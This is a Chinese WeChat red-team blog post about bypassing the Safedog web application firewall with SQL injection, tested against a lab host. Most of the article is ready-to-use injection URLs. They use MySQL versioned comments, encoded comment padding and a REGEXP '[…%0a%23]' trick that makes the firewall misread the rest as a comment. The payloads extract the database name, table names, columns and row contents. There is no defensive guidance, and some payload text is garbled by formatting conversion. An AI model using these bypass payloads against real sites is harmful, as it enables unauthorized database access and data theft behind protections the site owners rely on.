#  sql注入bypass最新版某狗

原创 yicunyiye  [ 红队蓝军 ](javascript:void\(0\);)

**红队蓝军** ![]()

微信号 Xx_Security

功能介绍 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。

____

___发表于_

收录于合集

#waf绕过 1 个

#sql注入 2 个

#web 23 个

## 安全狗最新版本

![](https://gitee.com/fuli009/images/raw/master/public/20230222174147.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174206.png)  

  

## and绕过

http://192.168.111.16/index.php?id=1%20and%20/ _!500011_ /=/ _!500011_ /

http://192.168.111.16/index.php?id=1%20and%20/ _!500011_ /=/ _!500012_ /

http://192.168.111.16/index.php?id=if((1=2),1,1)

http://192.168.111.16/index.php?id=1%20and/ _%!%22/_ /1=1%20--%20+

## order by 绕过

/*%!*干扰

http://192.168.111.16/index.php?id=1/ _%2a%%2f_ /order/ _%2f%2f_ /by/ _%2f%2f_
/2

![](https://gitee.com/fuli009/images/raw/master/public/20230222174208.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174210.png)  
  

## union select 绕过

![](https://gitee.com/fuli009/images/raw/master/public/20230222174211.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174212.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174214.png)

  

## 获取当前数据库和用户

![](https://gitee.com/fuli009/images/raw/master/public/20230222174215.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174216.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174217.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174219.png)

数据库同理

http://192.168.111.16/index.php?id=-1/ _%2a%%2f_ /union/ _%2f%2f_ //
_!50144select_ // _%2f%2f_ /1,database(/ _%2f%2f_ /)

## 获取数据库表

http://192.168.111.16/index.php?id=1/ _%2a%%2f_ /union/ _%2f%2f_ //
_!50441select_ // _%2f%2f_
/1,group_concat(table_name)%20from%20information_schema.tables%20where%20/
_wad_ /table_schema=database(/ _//_ /)

不拦截

http://192.168.111.16/index.php?id=-1%20/ _%2a%%2f_ /union/ _%2f%2f_ //
_!50144select_ // _%2f%2f_
/1,group_concat(table_name),3%20%20%0a%20%20from%20information_schema.tables%20where%20table_schema=database(/
_//_ /)

拦截

http://192.168.111.16/index.php?id=-1 REGEXP "[…%0a%23]" / _%2a%%2f_ /union/
_%2f%2f_ // _!50144select_ // _%2f%2f_ /1,group_concat(table_name),3  %0a
from information_schema.tables where table_schema=database(/ _//_ /)

这里其实REGEXP
"[…任意%23]"就行，在url解码%23变成了#，安全狗认为后面全都成为了注释符，带入到mysql层面其实%23只是正则的一个参数并不是注释符

![](https://gitee.com/fuli009/images/raw/master/public/20230222174220.png)

  

## 获取表字段

http://192.168.111.16/index.php?id=-1 REGEXP "[…%0a%23]" / _%2a%%2f_ /union/
_%2f%2f_ // _!50144select_ // _%2f%2f_ /1,group_concat(column_name),3  %0a
from information_schema.columns where table_name="newss"

![](https://gitee.com/fuli009/images/raw/master/public/20230222174221.png)

## 获取数据

http://192.168.111.16/index.php?id=-1 REGEXP "[…%0a%23]" / _%2a%%2f_ /union/
_%2f%2f_ // _!50144select_ // _%2f%2f_ /1,content,3  %0a  from newss

![](https://gitee.com/fuli009/images/raw/master/public/20230222174222.png)

加下方微信，拉你一起进群学习

![](https://gitee.com/fuli009/images/raw/master/public/20230222174223.png)

往期推荐

[

软件调试详解

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495570&idx=1&sn=1eaf3a28aa19b1c676bc740359f79124&chksm=ce67552ef910dc38888ad1440e924455e61339fbcc38a805b9ce14b946b58d955d0826d2a2e5&scene=21#wechat_redirect)[

初探windows异常处理

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495224&idx=1&sn=7052bb8495ba625afffb53e1cb67182b&chksm=ce675484f910dd922edf20ac385d83910d1e4a4343e11bb9a926bce1834f4d18cda5df55449a&scene=21#wechat_redirect)[

浅谈hook攻防

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494646&idx=1&sn=18642da97929e4e6cb7bb46627a77883&chksm=ce67514af910d85c5c74b9e4d883ed423f6c07253836aa47d77fccdfa8931e77e8c9d236dc93&scene=21#wechat_redirect)[

无处不在的dll劫持

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494314&idx=1&sn=41e5f267a2640c9d461f2f2716b51660&chksm=ce675016f910d9007d30eb432a61ec64e835d7095c1260cccc0786970000edc7788c8bb18ba8&scene=21#wechat_redirect)[

CVE-2021–26855与CVE-2021–27065分析及复现

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494271&idx=1&sn=494c5be0aff6e7636457abf50042045f&chksm=ce6750c3f910d9d5818a5b54064058292fda5639fef69f816c6a6ec2b4448c0a4fc781192158&scene=21#wechat_redirect)[

Windows环境下的调试器探究

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494183&idx=1&sn=ce69e5814af59b13bdb938a8a57dc02f&chksm=ce67509bf910d98d56130d8ad47facac1108a50fcedad3dc9a3ca6b427c7066e7fc8618a4a36&scene=21#wechat_redirect)[

构建API调用框架绕过杀软hook

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247493693&idx=1&sn=0238c1582821d02b43d533cc686c591a&chksm=ce675281f910db976104235741657913b993bb3a59f301871f24cae6f075343e49a8a46f54bf&scene=21#wechat_redirect)[

记一次内网渗透靶场学习

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247493643&idx=1&sn=b5c7e906aa6ca46671dbf20448fd56c2&chksm=ce6752b7f910dba1e195b430216e346064f57ecc0fb39ee46ceb1b58a56ce6d3176c916af367&scene=21#wechat_redirect)[

hw面试题解答版

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247493385&idx=1&sn=adf8e946259723422b02304d840da48f&chksm=ce675db5f910d4a3c477036d5975eb643f5cea9e7faa92e8db42b0edc741a3cf078e521a49c7&scene=21#wechat_redirect)[

bypass Bitdefender

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247492978&idx=1&sn=26867bc1af6619ffe44897a4e834dd37&chksm=ce675fcef910d6d8c9209cd8732073f4a2857c9fb74ab36560ec6f39c7e2d5327519a6b9bc2d&scene=21#wechat_redirect)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230222174225.png)

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

